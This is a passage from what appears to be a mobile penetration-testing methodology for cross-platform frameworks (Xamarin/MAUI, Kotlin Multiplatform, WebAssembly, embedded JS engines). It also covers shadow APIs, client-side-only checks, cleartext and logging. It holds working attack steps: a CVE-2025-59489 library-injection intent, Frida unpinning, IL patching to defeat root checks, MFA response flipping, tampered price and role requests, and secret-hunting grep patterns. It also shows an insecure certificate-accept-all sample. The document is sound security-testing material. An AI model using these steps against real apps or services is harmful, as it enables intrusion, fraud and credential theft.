  a `unity` command-line extras bridge on that activity. Game code also frequently reads intent extras —
  deep-link payloads, promo codes, debug flags — via `AndroidJavaObject` calls from C#.
- **How:**
  ```bash
  grep -n -A15 'com.unity3d.player' out/AndroidManifest.xml
  apkanalyzer manifest print target.apk | grep -i "UnityPlayerActivity\|UnityPlayerGameActivity"
  adb shell dumpsys package <pkg> | sed -n '/Activity Resolver Table/,/Service Resolver/p'
  grep -nE 'getIntent|AndroidJavaObject|currentActivity|getStringExtra' out/dump.cs | head -40
  # generic extras:
  adb shell am start -n <pkg>/com.unity3d.player.UnityPlayerActivity --es <extra> "<value>"
  # the CLI-extras bridge (CVE-2025-59489):
  adb shell am start -n <pkg>/com.unity3d.player.UnityPlayerActivity -e unity "-xrsdk-pre-init-library /path/to/lib.so"
  ```
- **Proof:** For the extras case, `dump.cs` showing the C# method that reads the extra plus an observable
  behaviour change on device. For CVE-2025-59489, your library's constructor executing inside the target
  process — print `android.os.Process.myUid()` and `getPackageName()` from it to prove whose UID you are in.
- **Escalation:** -> D08 for the intent-injection mechanics; a debug/cheat flag reaching a server-trusted
  value -> D19-063/D23. Also check the Unity engine version against known engine CVEs and against the FreeType
  bundling table (CVE-2025-27363) -> D16/D17.
- **Ruled out when:** No Unity player activity is exported in `dumpsys package`, or the engine version is at
  or above the patched line for CVE-2025-59489 and the library-load extra is ignored (show the launch with no
  `dlopen` in a `frida-trace -i "dlopen*"` capture).

### D19-066 · Xamarin / .NET MAUI: extract the assemblies — the layout changed at .NET 9

| | |
|---|---|
| **Severity ceiling** | Support (enables the Critical secret/crypto/pinning findings) |
| **VRT** | n/a as recon |
| **Attacker** | n/a |
| **Applies to** | Xamarin.Android and .NET MAUI. `assemblies/assemblies.blob` is the **.NET ≤ 8 (LEGACY) layout**; `lib/<abi>/libassemblies.<abi>.blob.so` is **.NET 9+ (CURRENT)** |
| **Maps to** | pyxamstore README (`unpack -d`, `pack`, LZ4 handling, and the caveat that "DLLs containing associated debug or configuration data are not fully supported"); HN Security write-up (`pyxamstore unpack -d apktoolOut/unknown/assemblies/`); mwalkowski .NET MAUI 9 write-up (`payload` ELF section, `XABA` magic `0x41424158`, 20-byte header, 28-byte `AssemblyStoreEntryDescriptor`, `XALZ` + LZ4 with the uncompressed size at bytes 8..12, and the `pymauistore` automation); Appknox guide (`Xamarin_XALZ_decompress.py`, `XamAsmUnZ`) |

- **Test:** All Xamarin/MAUI business logic is IL in .NET assemblies. Where those assemblies live changed
  between generations, so a tester who only knows the old layout concludes "there is nothing here". Also
  establish whether IL was stripped by full AOT before drawing that conclusion — Android Xamarin builds are
  usually JIT with IL present and decompilable; full AOT requires Enterprise licensing and changes the game.
- **How:**
  ```bash
  unzip -l target.apk | grep -E 'assemblies|libmonosgen|libassemblies|libxamarin-app|libaot-|libmonodroid'
  # (A) Classic Xamarin / .NET <= 8
  apktool d target.apk -o out/
  pyxamstore unpack -d out/unknown/assemblies/       # auto-decompresses LZ4 "XALZ" entries
  ls out/assemblies/out/*.dll
  # (B) .NET MAUI 9+
  llvm-readelf -S ext/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so | grep -i payload
  llvm-objcopy --dump-section=payload=payload.bin ext/lib/arm64-v8a/libassemblies.arm64-v8a.blob.so
  xxd -l 20 payload.bin        # 58 41 42 41 = "XABA", then version, entry_count, index_entry_count, index_size
  python3 - <<'PY'
  import struct, lz4.block
  d = open('payload.bin','rb').read()
  magic, ver, cnt, idx_cnt, idx_sz = struct.unpack_from('<IIIII', d, 0)
  assert magic == 0x41424158, hex(magic)
  print('entries', cnt)
  off = 20
  for i in range(cnt):
      (mapping_index, data_offset, data_size, debug_offset, debug_size,
       config_offset, config_size) = struct.unpack_from('<IIIIIII', d, off + i*28)
      blob = d[data_offset:data_offset+data_size]
      if blob[:4] == b'XALZ':
          usz = struct.unpack_from('<I', blob, 8)[0]
          blob = lz4.block.decompress(blob[12:], uncompressed_size=usz)
      open('dll_%d.dll' % i, 'wb').write(blob)
  PY
  ilspycmd dll_0.dll | head -40
  # AOT check: readable C# => IL present. Empty method bodies + libaot-*.so => full AOT, reverse natively.
  ```
- **Proof:** A directory of `.dll` files including app assemblies (not just `System.*`/`Mono.*`), opening in
  ILSpy/dnSpy/dotPeek with readable C# and real first-party namespaces — or, for a full-AOT build,
  `libaot-*.so` present with stubbed IL, which is the negative you record.
- **Escalation:** -> D19-067 (pinning, root checks, crypto), D19-068 (IL patching), D19-011 (endpoints),
  D19-012 (secrets), D19-037 (keys in the blob).
- **Ruled out when:** No `assemblies/`, no `libassemblies.<abi>.blob.so`, no `libmonodroid.so`/`libmonosgen-2.0.so`
  in any split — the app is not Xamarin/MAUI. If assemblies are present but `ilspycmd` shows only empty method
  bodies alongside `libaot-*.so`, record full AOT and route the review to native reversing (-> D16).

### D19-067 · Xamarin / MAUI: managed-layer pinning, root checks and crypto

| | |
|---|---|
| **Severity ceiling** | Critical (for the crypto/secret half); Low for the pinning half |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a hardcoded key; `mobile_security_misconfiguration.ssl_certificate_pinning.defeatable` (**P5**) for the pinning half — file the traffic finding instead |
| **Attacker** | AM-01 for the key; AM-06/AM-07 for the traffic |
| **Applies to** | Xamarin.Android, .NET MAUI |
| **Maps to** | Appknox Xamarin guide (`ServicePointManager.ServerCertificateValidationCallback`; Fridax as "primary tool for runtime Xamarin hooking"; the `xamarin-unpin` Frida script); `@Gand3lf/xamarin-antiroot` ("Bypass antiroot detection for Xamarin apps!") |

- **Test:** .NET apps pin, root-check and encrypt in managed code, typically via
  `ServicePointManager.ServerCertificateValidationCallback` or an `HttpClientHandler`. Standard
  `Java.perform`/ObjC Frida APIs do not reach Mono-managed methods — you must hook at the Mono boundary or use
  a Xamarin-aware layer. Crypto here is plain C#, which is the fastest hardcoded-key path in any framework.
- **How:**
  ```bash
  for f in out/assemblies/out/*.dll; do ilspycmd "$f"; done > all.cs
  grep -nE 'ServerCertificateValidationCallback|ServerCertificateCustomValidationCallback|HttpClientHandler' all.cs | head
  grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' all.cs | head -40
  grep -nE 'IsJailBroken|isRooted|RootBeer|checkRoot|SafetyNet|PlayIntegrity|isEmulator' all.cs | head
  grep -nE 'GetInstallerPackageName|signatures|PackageInfo' all.cs | head
  # runtime:
  frida-trace -U -f <pkg> -i "mono_*"          # surface the Mono API in use
  frida -U -f <pkg> -l fridax.js --no-pause    # Fridax, for managed-method hooking
  frida --codeshare <xamarin-unpin script> -U -f <pkg>
  ```
- **Proof:** For crypto, a literal key/IV byte array in the decompiled source plus a successful offline
  decryption of the app's stored data with it. For pinning, the managed callback's arguments and return value
  printed at runtime, or intercepted traffic after the unpin script loads.
- **Escalation:** Key -> D12 and offline decryption of exfiltrated data; pinning -> the traffic findings in
  D14/D15. Note that a signature or installer check written in managed code is patchable client-side and is
  therefore an enabling weakness, not a control (-> D19-078).
- **Ruled out when:** No validation callback is overridden (pinning is delegated to the platform), the crypto
  derives its key from a Keystore-backed or server-issued source, and the root check is implemented natively.
  Show the Mono trace confirming the callback is not invoked, rather than concluding it from the absence of a
  grep hit — obfuscated assemblies rename methods.

### D19-068 · Xamarin / MAUI: patch IL and rebuild the assembly store to prove a client-side check is the only control

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High by what the bypass unlocks |
| **VRT** | `lack_of_binary_hardening.lack_of_jailbreak_detection` (**P5**) if filed as a resilience issue — file the unlocked control instead |
| **Attacker** | AM-12 own device |
| **Applies to** | Xamarin.Android and .NET ≤ 8 MAUI (blob layout). For .NET 9 MAUI use the `payload`-section extraction and rebuild path |
| **Maps to** | HN Security write-up (`pyxamstore unpack -d apktoolOut/unknown/assemblies/`, dnSpy `IsJailBroken()` -> `return false`, `pyxamstore pack`, `apktool b`, `uber-apk-signer`, and the split-APK `pm install-create/write/commit` install path); pyxamstore README (`assemblies.json` is required for the repack); MASTG-TOOL-0103 |

- **Test:** The cleanest Xamarin PoC is an IL edit: flip the method that gates a feature, repack the assembly
  store, re-sign, install. It demonstrates that the gate is client-side and nothing else enforces it.
- **How:**
  ```bash
  apktool d target.apk -o out/
  pyxamstore unpack -d out/unknown/assemblies/
  # dnSpy: locate the check (e.g. IsJailBroken()), right-click > Edit Class > body: return false;
  #        > Compile > File > Save Module (overwrite the DLL)
  pyxamstore pack                                  # uses the assemblies.json written during unpack
  cp assemblies.blob assemblies.manifest out/unknown/assemblies/
  apktool b out/ -o repacked.apk
  java -jar uber-apk-signer.jar --apks repacked.apk
  adb install -r repacked-aligned-debugSigned.apk
  ```
- **Proof:** The app running normally on a device it previously refused, or the gated feature becoming
  available — captured on screen, then followed by the server-side consequence.
- **Escalation:** Rate the unlocked control, not the patch: a paid tier that the server then honours is
  D23/Critical; a hidden admin console is D15. Root-detection bypass alone is P5 and belongs in the Graveyard.
- **Ruled out when:** The repacked APK fails to launch because a native (not managed) integrity check rejects
  it, and you have confirmed the check is native by finding it in `libxamarin-app.so`/`libmonodroid.so` rather
  than in the IL. Even then, the finding is the control that survives, not the one that did not.

### D19-069 · Kotlin Multiplatform: map `commonMain` versus `androidMain` before rating the finding

| | |
|---|---|
| **Severity ceiling** | Support (it is a severity multiplier on whatever the underlying defect is) |
| **VRT** | n/a directly |
| **Attacker** | n/a |
| **Applies to** | Kotlin Multiplatform / Compose Multiplatform Android targets |
| **Maps to** | (method; no external identifier verified in this corpus for KMP specifically) |

- **Test:** In a KMP app a defect in `commonMain` affects every target; a defect in `androidMain` affects only
  Android. This changes severity, remediation scope and the report's scope statement, and it should be stated
  explicitly. KMP compiles shared Kotlin to normal JVM bytecode, so the shared module is in the DEX — but the
  `expect/actual` indirection makes it easy to review only the Android half.
- **How:**
  ```bash
  jadx -d out target.apk
  grep -rl "kotlin.Metadata" out/sources | head
  grep -rn 'expect fun\|actual fun\|actual class\|expect val\|actual val' out/sources 2>/dev/null | head
  grep -rn "class .*\\\$.*Android\b\|AndroidPlatform\|platform\.Android" out/sources | head
  # the usual KMP stack — ktor, SQLDelight, multiplatform-settings, okio:
  grep -rnE 'io\.ktor|app\.cash\.sqldelight|com\.russhwolf\.settings|okio' out/sources | head
  grep -rn 'HttpClient(\|install(\|CIO\|OkHttp(' out/sources | head -30
  grep -rn 'trustManager\|X509TrustManager\|checkServerTrusted' out/sources | head
  ```
- **Proof:** The vulnerable function located inside a class that is clearly shared — no `android` import,
  referenced from an `actual` binding — and, where you have the iOS artefact, the same logic present there.
- **Escalation:** Elevates the underlying defect: a permissive `X509TrustManager` or a hardcoded key in
  `commonMain` is a cross-platform High/Critical, not an Android-only one, and should be reported once with
  the multi-platform note. The same applies to freeRASP-style protection living in the shared module — one
  bypass covers both platforms.
- **Ruled out when:** Every security-relevant class carries Android-specific imports or sits under an
  `androidMain`-shaped package, and the shared module contains only data models and serialisation. State the
  boundary you established rather than leaving scope implicit.

### D19-070 · Kotlin Multiplatform: secret injection via `expect/actual` and generated constants

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Kotlin Multiplatform |
| **Maps to** | (method; KMP secrets guidance: the `expect/actual` pattern, Android `BuildConfig` fed from `local.properties`, a Gradle-generated secrets file, and the explicit caveat that "anyone with the app can disassemble and retrieve the secret") |

- **Test:** KMP guidance routes secrets through `BuildConfig` fields fed from `local.properties`, or a
  Gradle-generated constants file. Either way the value ends up as a string literal in the DEX — and it is
  invisible to a manifest review because the `expect/actual` indirection hides where it came from.
- **How:**
  ```bash
  grep -rn 'class BuildConfig' out/sources | head
  grep -rnoE '(String|val) +[A-Z_]{4,} *= *"[^"]{12,}"' out/sources | head -60
  grep -rn 'expect val\|actual val' out/sources | grep -iE 'key|secret|token|url' | head
  grep -rniE 'API_KEY|CLIENT_SECRET|BASE_URL|TOKEN *=|SECRET *=' out/sources --include='*.java' | head -50
  ```
- **Proof:** A live key recovered from the generated constants class and validated against the service per
  D19-012.
- **Escalation:** -> D18 backend abuse. Note in the report that the same secret is present in the iOS build —
  it is the same `commonMain` code with a different `actual`.
- **Ruled out when:** The constants class holds only public identifiers and base URLs, and every credential is
  fetched post-authentication. Validate the candidates; do not judge by name.

### D19-071 · WebAssembly modules shipped in the WebView or the app runtime

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) where key material is recovered; `broken_access_control.privilege_escalation` (null) where a licence/entitlement decision the server trusts is bypassed |
| **Attacker** | AM-01 (offline analysis) / AM-12 (runtime interception) |
| **Applies to** | Cordova/Ionic/Capacitor WebViews, RN WebViews, Unity WebGL builds embedded in a WebView, and any in-app browser rendering first-party content that loads Wasm |
| **Maps to** | Il2CppDumper README (WASM is an explicitly supported binary format, with a dedicated `ghidra_wasm.py` for the ghidra-wasm-plugin — Unity WebGL/Wasm targets are dumpable the same way) |

- **Test:** Some apps ship `.wasm` modules for crypto, DRM, licence checks or ML inside the web assets, or
  load them from the network. Wasm is not obfuscation — it decompiles, and it can be hooked from JavaScript.
- **How:**
  ```bash
  find out/assets -name '*.wasm'
  grep -rnE 'WebAssembly\.(instantiate|compile|instantiateStreaming|compileStreaming)' out/assets/{www,public} 2>/dev/null | head
  wasm-objdump -x module.wasm | head -60
  wasm2wat module.wasm -o module.wat && grep -nE '\(export|\(import' module.wat | head -40
  wasm-decompile module.wasm -o module.dcmp
  ```
  ```javascript
  // runtime: intercept every module before it is instantiated
  const _i = WebAssembly.instantiate;
  WebAssembly.instantiate = function (buf, imports) {
    console.log('[wasm] bytes', buf && buf.byteLength, 'imports', Object.keys(imports || {}));
    return _i.apply(this, arguments).then(r => {
      console.log('[wasm] exports', Object.keys(r.instance ? r.instance.exports : r.exports));
      return r;
    });
  };
  ```
- **Proof:** The module's export list (`verifyLicense`, `decrypt`, `sign`) plus a demonstration that calling an
  export directly from JS produces the privileged result, bypassing the app's own call path — and, for the
  Critical form, the server accepting the outcome.
- **Escalation:** An exported crypto function plus recovered key material is offline forgery -> D12, D15.
  A licence/entitlement decision the server trusts -> D23.
- **Ruled out when:** No `.wasm` ships and no `WebAssembly.*` call appears in the assets, or the module's
  exports are purely computational (codecs, maths) with no security decision and no key material — list the
  exports in your notes to make the negative concrete.

### D19-072 · Other embedded JS runtimes evaluating network-fetched script

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) when the script text is attacker-influenceable |
| **Attacker** | AM-09 malicious backend/CDN; AM-06 where the fetch is unauthenticated or interceptable |
| **Applies to** | any Android app embedding a JS engine — including React Native apps that add a **second** engine for server-driven UI |
| **Maps to** | (method; symbol-based engine detection); MASWE-0049 (CWE-494); ATT&CK T1407 |

- **Test:** Beyond React Native, apps ship general JS engines (QuickJS, Duktape, JerryScript, V8,
  JavaScriptCore) for rules engines, feature flags, A/B logic and server-driven UI. If the script source is
  fetched at runtime and not signed, the server — or an on-path attacker — executes code inside the app.
- **How:**
  ```bash
  for so in ext/lib/arm64-v8a/*.so; do
    echo "== $so"
    nm -D "$so" 2>/dev/null | grep -iE 'JS_Eval|JS_NewRuntime|duk_|v8::|JSEvaluateScript|JSGlobalContextCreate'
  done
  strings ext/lib/arm64-v8a/*.so | grep -aiE 'quickjs|duktape|jerryscript|hermes|jsc |v8 ' | sort -u | head
  frida-trace -U -f <pkg> -i 'JS_Eval*' -i 'duk_eval*' -i 'JSEvaluateScript*' -i 'duk_peval*'
  ```
- **Proof:** A trace showing script text arriving from the network and being evaluated, with the source of
  that text identified as an unauthenticated or unsigned HTTP response — then your own script executing after
  you serve a modified response.
- **Escalation:** Same impact set as the OTA items: code in the app's UID, every bridge and every stored
  credential (-> D19-018, D11, D13). -> D17.
- **Ruled out when:** The only JS engine present is the app's primary framework engine, no `eval`-family
  symbol appears in a `frida-trace` over a full app walkthrough, or the script text is a compile-time asset
  with a verified signature (show the verification, and the rejection of a modified script).

### D19-073 · Shadow API — the mobile build's hardcoded backend calls are usually an older API version

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the old version accepts no token; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) / `.view_sensitive_information_iterable_object_identifiers` (P3) for the field-exposure and object-access regressions |
| **Attacker** | AM-01 remote no interaction |
| **Applies to** | any versioned API reached by a cross-platform client. **This is the highest-value mobile-to-backend bridge in the whole methodology** |
| **Maps to** | ATT&CK T1533; the endpoint inventory from D19-011 is the input |

- **Test:** Old API versions stay reachable without receiving the same fixes, and a mobile app's hardcoded
  backend calls are the number-one source of old-version endpoints — "a mobile app whose hardcoded backend
  calls look older than the current web app's". **The bug is the delta**, not the existence of the old
  version.
- **How:**
  ```bash
  for v in v1 v2 v3 v4 beta alpha internal legacy old 2022-01-01 2023-01-01 2024-01-01; do
    curl -s -o /dev/null -w "%{http_code} /api/$v/\n" "https://$TARGET/api/$v/"
  done
  curl -s -H "X-API-Version: 1" https://$TARGET/api/users
  curl -s -H "Accept: application/vnd.company.v1+json" https://$TARGET/api/users
  for sub in api api-v1 api-v2 apiv1 apiv2 legacy-api old-api internal-api staging-api; do
    curl -s -o /dev/null -w "%{http_code} $sub\n" "https://$sub.$TARGET/"
  done
  ```
  Anything other than `404`/connection-refused is live. Then diff **four security-relevant behaviours**
  between the mobile-sourced version and the current one, for the **same operation**:
  1. **auth strength** — does v1 accept no token, an expired token, or a lower-privilege token that v2 rejects?
  2. **rate limiting** — burst both; a missing 429 on v1 means throttling was never backported.
  3. **input validation** — send the same injection/oversized payload to both.
  4. **field exposure** — does v1 return internal IDs or PII the current version redacts?
- **Proof:** A security regression on the old path, demonstrated with the same request against both versions
  side by side. **A version difference alone is Informational** — the weakened control is the finding.
- **Escalation:** -> D15 for the full IDOR/mass-assignment pass on the old version. Treat **every**
  bundle-sourced endpoint as a version-diff candidate.
- **Ruled out when:** The mobile-sourced routes resolve to the same version and handlers the current web
  client uses (compare a response fingerprint, not just the path), or every legacy path returns 404/410 with
  the operation not executing. A static "this version is deprecated" 200 is not a live endpoint.

### D19-074 · Client-side-only validation, rate limits and MFA because the logic moved to shared code

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.privilege_escalation` (null) or `broken_authentication_and_session_management.authentication_bypass` (P1) for the auth cases; `broken_authentication_and_session_management.two_fa_bypass` (P3) for the MFA case |
| **Attacker** | AM-01 |
| **Applies to** | all frameworks; most acute in RN/Flutter/KMP, where "write the logic once and share it" is the selling point |
| **Maps to** | n/a (method); the failure shapes below are drawn from the bug-hunting corpus |

- **Test:** Cross-platform teams frequently implement validation once, in shared code, and assume the server
  mirrors it. Extract every client-side constraint — min/max amounts, role checks, allowed state transitions,
  attempt counters, MFA decisions — and try each one directly against the API.
- **How:**
  ```bash
  hermes-decomp decompile ext/assets/index.android.bundle -o out/ --deep
  grep -rnE 'if *\(.*(role|isAdmin|canEdit|amount|limit|maxQty|status) *[=!<>]' out/ | head -50
  grep -nE 'isAdmin|role|entitlement|canPurchase|maxAmount|attempts|retryCount|lockout' out_dir/asm/*.txt out/dump.cs 2>/dev/null | head -50
  grep -a -nE '"(amount|price|total|discount|couponValue|finalPrice)"' hbc.strings out_dir/pp.txt | head -40
  # then issue the request directly, bypassing the client entirely:
  curl -s -X POST https://api.target/orders -H "Authorization: Bearer $T" \
    -H 'Content-Type: application/json' -d '{"qty":99999,"price":0,"role":"admin"}' -i
  curl -s -X POST https://api.target/checkout -H "Authorization: Bearer $T" \
    -H 'Content-Type: application/json' -d '{"items":[{"id":"X","qty":1}],"total":0.01}' -i
  ```
  Three specific shapes worth testing by name:
  - **Client-only rate limits.** The app's own attempt counter is the only limit; replay the verify request
    directly with curl and see whether attempt N+1 succeeds after the UI would have locked out. Sample 100+
    attempts before claiming absence and distinguish per-IP, per-account, per-session and per-username
    throttling.
  - **Client-side-only MFA.** Submit a wrong OTP, intercept the response, flip `{"success":false}` to
    `{"success":true}` or `401` to `200`, and forward. **Real impact requires that the subsequent API calls
    also work** — if the API rejects them it is a cosmetic client bypass, not a finding; if a usable session
    was already issued at the password step, *that* is the bug.
  - **The layer-ordering trap.** A `400 "field X is required"` from an unauthenticated request does **not**
    prove you passed auth: many stacks run a body parser or sanitiser in front of the auth middleware.
    Re-test with a minimal well-formed `{}` before claiming an auth bypass:
    ```bash
    curl -s -X POST https://api.target/v1/resource -d '{'
    # 400 {"code":"ERR-INPUT-0001","message":"Invalid text..."}   <- looks like an auth bypass
    curl -s -X POST https://api.target/v1/resource -H 'Content-Type: application/json' -d '{}'
    # 401 {"code":"ERR-AUTH-0001","message":"Not authenticated."} <- this is where auth actually sits
    ```
    If the error text is about input shape or character class you are talking to a parser, not business
    logic. Only a domain-field error (`accountId is required`) that persists with a well-formed body is signal.
- **Proof:** The server accepting a value the client forbids — HTTP 200/201 with the out-of-range state
  persisted, confirmed by a follow-up GET. For the MFA case, the subsequent authenticated API call succeeding.
- **Escalation:** -> D15 (business logic), D13 (auth and MFA), D23 (price and entitlement). A cross-platform
  shared-code defect is present on every target the module builds for — say so (-> D19-069).
- **Ruled out when:** Each client-side constraint is independently enforced server-side (show the 4xx for the
  out-of-range value), rate limiting is observed with a statistically sound sample, and the response-flip
  produces a session the API rejects. Document the well-formed-`{}` control response for any auth claim.

### D19-075 · Framework cleartext and TLS configuration outside the Android Network Security Config

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insecure_data_transport.cleartext_transmission_of_sensitive_data` (null — rated on what travels) |
| **Attacker** | AM-06 network attacker, no trusted CA required |
| **Applies to** | Flutter, Unity, React Native, Cordova/Capacitor — any framework with a non-platform HTTP stack |
| **Maps to** | **MASTG-TEST-0237** (Cross-Platform Framework Configurations Allowing Cleartext Traffic — status **placeholder**; its note states: "Cross-platform frameworks (e.g. Flutter, React native, …), typically have their own implementations for HTTP libraries, where cleartext traffic can be allowed"), MASWE-0026, MASTG-KNOW-0015, MASTG-TECH-0151 (Analyzing the Network Security Configuration) |

- **Test:** A Network Security Config that forbids cleartext constrains the platform `HttpsURLConnection`/OkHttp
  path only. Dart's `HttpClient`, Unity's `UnityWebRequest` and Capacitor's native HTTP path do not go through
  it. Never conclude "cleartext is impossible" from the NSC alone — and note MASTG-TEST-0237 is a placeholder
  with no official method, so the commands below are the practical equivalent.
- **How:**
  ```bash
  grep -n 'networkSecurityConfig\|usesCleartextTraffic' out/AndroidManifest.xml
  cat out/res/xml/network_security_config.xml
  # React Native
  grep -a -nE "http://|useDeveloperSupport|__DEV__|localhost:8081" hbc.strings
  # Cordova / Capacitor
  grep -nE "<allow-navigation|<access origin|Content-Security-Policy|cleartext" out/res/xml/config.xml
  python3 -c "import json;d=json.load(open('out/assets/capacitor.config.json'));print(d.get('server',{}))" | grep -i cleartext
  # Flutter
  grep -rn "badCertificateCallback\|HttpOverrides" out_dir/asm/ 2>/dev/null
  # empirically — the only conclusive test
  adb shell settings put global http_proxy <host>:8080
  tcpdump -i any -n 'tcp port 80'      # on the test AP/host
  ```
  The developer-side shape worth recognising in Dart source or reconstructed assembly:
  ```dart
  class MyHttpOverrides extends HttpOverrides {
    @override
    HttpClient createHttpClient(SecurityContext? context) {
      return super.createHttpClient(context)
        ..badCertificateCallback = (X509Certificate cert, String host, int port) => true;
    }
  }
  // main(): HttpOverrides.global = MyHttpOverrides();
  ```
- **Proof:** A plaintext HTTP request from the app captured on the wire despite an NSC claiming
  `cleartextTrafficPermitted="false"` — with the sensitive value visible in that request. Cleartext carrying
  nothing sensitive is not a finding.
- **Escalation:** -> D14; cleartext or permissive navigation in a Cordova WebView -> D10 injection into the
  app origin -> the bridge chains.
- **Ruled out when:** A full-walkthrough packet capture shows no plaintext HTTP from the app's UID, every
  framework config key is TLS-only, and no `badCertificateCallback`/`HttpOverrides` appears in the
  reconstructed Dart. Remember the API gate: cleartext default-allow applies at `targetSdk<28` (**LEGACY**),
  and at `targetSdk>=28` the platform stack denies it — but only the platform stack.

### D19-076 · Framework verbose logging carrying bridge payloads

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); Critical only when the logged value is authentication material and a local reader exists |
| **Attacker** | AM-04 local app with a common permission (`READ_LOGS` where granted), AM-11 physical unlocked, or anyone receiving a bug report |
| **Applies to** | Capacitor and Cordova primarily; the RN/Flutter equivalents are `console.log`/`debugPrint` left in |
| **Maps to** | Capacitor `MessageHandler.java` (`Logger.verbose(Logger.tags("Plugin"), "To native (Cordova plugin): callbackId: … service: … action: … actionArgs: …")` and the Capacitor-plugin equivalent); Capacitor `CapConfig.java` (`loggingBehavior`: `none` / `debug` / `production`, `android.loggingEnabled`); MASTG-TOOL-0112 (pidcat) |

- **Test:** Capacitor logs every plugin call and every Cordova-compat call including `actionArgs`. If verbose
  logging survives into release, plugin arguments — which routinely include tokens, file paths and PII — land
  in logcat.
- **How:**
  ```bash
  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('loggingBehavior'))"
  python3 -c "import json;print(json.load(open('out/assets/capacitor.config.json')).get('android',{}).get('loggingEnabled'))"
  adb logcat -c
  # exercise login and a data-heavy flow, then:
  adb logcat -d | grep -iE 'To native \(|Plugin|Capacitor|Cordova|ReactNative|flutter' | head -80
  adb logcat -d | grep -aiE 'token|bearer|password|authorization|"pan"|otp|ssn'
  # what the JS/Dart layer ships to crash reporters:
  grep -aiE 'sentry|bugsnag|crashlytics|instabug|datadog' hbc.strings out_dir/pp.txt | sort -u | head
  grep -a -nE 'beforeSend|setExtra|setContext|setUser|attachStacktrace|addBreadcrumb' hbc.strings | head
  ```
- **Proof:** A logcat line containing a real credential, token or PII value from a **release** build, with the
  producing component named — or an intercepted crash-report request whose body carries user identifiers,
  tokens or message content.
- **Escalation:** -> D20 privacy and logging; a logged session token -> D15 replay.
- **Ruled out when:** `loggingBehavior` is `none` or `production`, a full authenticated walkthrough produces
  no sensitive value in `adb logcat -d`, and the crash reporter's `beforeSend` scrubs the payload (verify by
  forcing an exception and reading the outbound request). Empty logging is not a finding — do not report the
  configuration alone.

### D19-077 · False-positive discipline for framework-recovered endpoints, strings and behaviours

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (validity control) |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter that reaches an API or a rendered surface |
| **Maps to** | n/a (method; drawn from the bug-hunting corpus's false-positive register) |

- **Test:** Framework recovery produces a very high volume of candidate strings and routes. Four disciplines
  keep the resulting report defensible.
- **How:**
  - **Marker discipline.** When testing whether a recovered field reflects or persists, use a random
    alphanumeric marker of **8+ characters** with no English words and no protocol keywords — `cpmark987abc`,
    `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Never `test`, `marker`, `evil`, `attacker`, `payload`,
    `javascript`, `script`, `AAAA`, or your own domain. **Search the baseline (no-marker) response for the
    marker string before claiming reflection** — this one check kills most false reflection reports.
  - **Body-diff rule.** A bypass claim requires a response **body** differential, not a status code.
    ```bash
    diff <(curl -s "<baseline>") <(curl -s "<bypass>") | head
    ```
    A 200 with a byte-identical body is not a bypass. Status-code-only claims are the most commonly rejected
    category on bug-bounty platforms.
  - **Statistical-sample rule.** For any timing, rate-limit or race claim against a framework-recovered
    endpoint: minimum **n ≥ 10 interleaved trials per group**, randomised order, and a signal requires the
    suspect group's mean to be **≥ 2σ** above the control's. Report the distribution, not the outlier.
  - **Shell-loop ban.** Do not iterate more than about five items in a shell array loop — they fail silently.
    Use Python, and **always count your results**:
    ```bash
    wc -l endpoints.final results.txt
    ```
  - **Server-policy-versus-state.** Establish whether a differentiator tracks *your input* or a fixed
    deny-list. A `403 → 200` flip with a header you added is meaningful; a `200` both with and without it
    means the path was never protected.
  - **Adjacency is not a call site.** The Hermes string table is sorted and deduplicated, so two strings
    appearing next to each other does not mean they are used together. Mark any adjacency-based claim as
    unproven.
- **Proof:** A negative-control artefact for each claim: the baseline lacking the marker, the byte-level diff,
  the distribution table, the result counts.
- **Escalation:** n/a — this is the gate before filing.
- **Ruled out when:** n/a. Run it on every framework-derived finding.

### D19-078 · Report discipline: state the runtime and artefact identity; never report recovery as the finding

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a (triage control) |
| **Attacker** | n/a |
| **Applies to** | every finding in this chapter |
| **Maps to** | MASTG-TOOL-0104 (the `file`-based engine identification MASTG itself prescribes), MASTG-TECH-0165 |

- **Test:** A cross-platform finding is not reproducible without the runtime, the bundle/snapshot identity and
  the tool versions. And every recovery result must be converted into a concrete data, auth, integrity or
  financial impact, or dropped.
- **How:** Include in each finding: package and `versionCode`; framework and engine (`Hermes JavaScript
  bytecode, version 94`); the bundle `sourceHash` or Dart snapshot hash; whether OTA is enabled and which
  bundle was live at test time; the exact file path inside the APK; and the extraction tool with its version
  (`hermes-decomp v0.1.7`, the `blutter` commit, the `Il2CppDumper` version). Then apply the filter: for each
  recovery result ask whether it yields a credential that authenticates (D19-012), an endpoint that IDORs
  (D19-011, D19-073), a client-side gate the server trusts (D19-074), or an unsigned code channel (D19-026,
  D19-027). If none, fold it into the methodology section rather than filing it.
  Record the **framework-runtime severity multiplier** explicitly in the impact paragraph so the triager
  rates it correctly, for example:
  - "XSS in this Capacitor WebView is not limited to the page: `AndroidProtocolHandler.openFile()` serves any
    app-readable path under `/_capacitor_file_`, and `androidBridge.postMessage` invokes native plugins, so
    script execution equals app-sandbox file read plus native capability execution."
